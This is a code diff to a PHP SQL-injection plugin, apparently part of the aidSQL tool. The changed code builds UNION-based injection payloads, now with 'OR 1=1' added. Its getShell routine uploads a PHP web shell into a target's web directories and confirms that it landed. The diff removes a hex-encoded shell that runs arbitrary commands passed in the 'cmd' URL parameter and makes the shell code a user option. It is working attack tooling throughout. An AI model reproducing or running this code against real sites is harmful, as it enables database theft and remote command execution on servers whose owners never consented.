@@ -26,7 +26,6 @@
 			private	$_getCompleteSchema			=	TRUE;
 			private	$_version						=	NULL;
 
-
 			public function getPluginName(){
 				return self::PLUGIN_NAME;
 			}
@@ -85,7 +84,7 @@
 					$this->setInjectionAttempts($config["injection-attempts"]);
 
 				}
-				
+
 			}
 
 
@@ -746,10 +745,11 @@
 
 				if($useEndingPayload){
 
-					$value		= "$value UNION ALL SELECT $injection ".$this->_currTerminatingPayload." ".$this->getQueryCommentOpen();
+					$value		= "$value OR 1=1 UNION ALL SELECT $injection ".$this->_currTerminatingPayload." ".$this->getQueryCommentOpen();
+
 				}else{
 
-					$value		= "$value UNION ALL SELECT $injection ".$this->getQueryCommentOpen();
+					$value		= "$value OR 1=1 UNION ALL SELECT $injection ".$this->getQueryCommentOpen();
 
 				}
 
@@ -860,9 +860,11 @@
 
 			}
 
+
 			public function getShell(\aidSQL\core\PluginLoader &$pLoader,\aidSQL\http\crawler $crawler,Array $options){
 
 				$restoreUrl				=	$this->_httpAdapter->getUrl();
+				$shellCode				=	$this->_shellCode;
 
 				$webDefaultsPlugin	=	$pLoader->getPluginInstance("info","defaults",$this->_httpAdapter,$this->_log);
 				$information			=	$webDefaultsPlugin->getInfo();
@@ -902,13 +904,11 @@
 
 				}
 
-				$shellCode	=	"0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e";
-			
 				$url	=	$this->_httpAdapter->getUrl();
 				$host	=	$url->getHost();
 				$url	=	$url->getScheme()."://$host";
 
-				$fileName	=	substr(preg_replace("#[0-9]#",'',md5(rand(0,time()))),0,mt_rand(1,8)).".php";	
+				$fileName	=	$this->getShellName();
 
 				foreach($webDirectories as $key=>$webDir){
 
@@ -940,9 +940,10 @@
 							try{
 
 								$this->analyzeInjection($injection,FALSE);
+
 								$result			=	$this->analyzeInjection($this->loadFile($shellDirLocation));
 								$decodedShell	=	\String::asciiEncode($shellCode);
-							
+
 								if($result!==FALSE&&sizeof($result)){
 
 									if($result[0]==$decodedShell){
@@ -952,6 +953,8 @@
 								}
 							
 							}catch(\Exception $e){
+
+
 							}
 
 						}	
@@ -959,6 +962,7 @@
 					}
 
 				}
+
 
 				return FALSE;
 
@@ -974,6 +978,7 @@
 				$logger->log("--sqli-mysql5-field-payloads\t\tSet field payloads delimited by _\ti.e: _'_')_%)");
 				$logger->log("--sqli-mysql5-ending-payloads\t\tSet ending payloads delimited by _\ti.e: LIMIT 1,1_ORDER BY 1");
 				$logger->log("--sqli-mysql5-comment-payloads\t\tSet comment payloads delimited by _\ti.e: #_/*_--");
+				$logger->log("--sqli-mysql5-shell-code\tPut your favorite shell code here i.e ".'<?php var_dump($_SERVER);?>');
 
 			}
 
